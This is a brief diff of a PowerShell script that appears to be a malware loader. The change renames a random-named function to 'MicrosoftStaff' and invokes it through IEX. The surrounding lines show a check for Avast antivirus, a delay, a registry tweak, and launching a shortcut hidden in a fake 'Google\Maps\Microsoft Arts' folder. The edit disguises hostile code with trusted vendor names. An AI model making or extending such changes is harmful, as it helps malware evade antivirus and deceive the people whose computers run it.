@@ -17,7 +17,7 @@ Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer
 
 
 
-Function UbboSatlahlk
+Function MicrosoftStaff
 {
 if([System.IO.File]::Exists("C:\Program Files\Avast Software\Avast\AvastUI.exe")){
 
@@ -169,4 +169,4 @@ start-sleep -s 60
  Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
 }
 }
-IEX UbboSatlahlk
+IEX MicrosoftStaff
